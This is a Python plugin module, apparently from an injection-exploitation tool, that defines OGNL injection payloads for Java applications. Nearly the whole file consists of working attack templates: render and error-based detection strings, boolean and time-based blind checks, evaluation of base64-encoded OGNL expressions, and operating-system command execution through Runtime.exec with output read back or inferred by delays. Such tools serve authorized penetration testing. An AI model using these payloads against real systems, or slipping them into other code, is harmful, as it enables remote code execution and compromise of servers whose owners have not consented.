from plugins.languages import java
from utils import rand


class OGNL(java.Java):
    priority = 5
    plugin_info = {
        "Description": """Object Graph Navigation Library (OGNL) injection in Java.""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """({header[0]}+{header[1]})+''+(""",
                'trailer': """)+''+1*({trailer[0]}+{trailer[1]})+''""",
                'test_render': f"""'{rand.randstrings[0]}'+1*(@java.lang.Integer@valueOf('2000000000')+2000000000)+'{rand.randstrings[1]}'""",
                'test_render_expected': f'{rand.randstrings[0]}-294967296{rand.randstrings[1]}'
            },
            'render_error': {
                'call': 'inject',
                'render': """{code}""",
                'header': """(({header[0]}+{header[1]})+''+(""",
                'trailer': """)+''+1*({trailer[0]}+{trailer[1]})+'ZZ')/0""",
                'test_render': f"""'{rand.randstrings[0]}'+1*(@java.lang.Integer@valueOf('2000000000')+2000000000)+'{rand.randstrings[1]}'""",
                'test_render_expected': f'{rand.randstrings[0]}-294967296{rand.randstrings[1]}'
            },
            'boolean': {
                'call': 'inject',
                'test_bool_true':  "(@java.lang.Integer@valueOf('1')/((1000000000+1000000000==2000000000)?1:0)+'')",
                'test_bool_false': "(@java.lang.Integer@valueOf('1')/((1000000000+2000000000==1000000000)?1:0)+'')",
                'verify_bool_true':  "(@java.lang.Integer@valueOf('1')/((2000000000+2000000000==-294967296)?1:0)+'')",
                'verify_bool_false': "(@java.lang.Integer@valueOf('1')/((2000000000+2000000000==-224667999)?1:0)+'')"
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """@ognl.Ognl@getValue(new String(@java.util.Base64@getDecoder().decode("{code_b64p}")),"").toString()""",
                'test_eval': '"executed".replace("xecu", "valua")',
                'test_eval_expected': 'evaluated'
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """(1/((!@ognl.Ognl@getValue(new String(@java.util.Base64@getDecoder().decode("{code_b64p}")),"").equals(false))?1:0)+'')""",
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """((!@ognl.Ognl@getValue(new String(@java.util.Base64@getDecoder().decode("{code_b64p}")),"").equals(false))?@java.lang.Thread@sleep({delay}000):0)""",
            },
            'execute': {
                'call': 'render',
                'execute': """new String(@java.lang.Runtime@getRuntime().exec(new String(@java.util.Base64@getDecoder().decode("{code_b64p}"))).inputStream.readAllBytes())""",
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """(@java.lang.Integer@valueOf('1')/((@java.lang.Runtime@getRuntime().exec(new String(@java.util.Base64@getDecoder().decode("{code_b64p}"))).waitFor()==0)?1:0)+'')""",
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """((@java.lang.Runtime@getRuntime().exec(new String(@java.util.Base64@getDecoder().decode("{code_b64p}"))).waitFor().equals(0))?@java.lang.Thread@sleep({delay}000):0)""",
            }
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}+', 'suffix': '+{rclosure}', 'closures': java.ctx_closures},
        ])

        self.language += ':ognl'
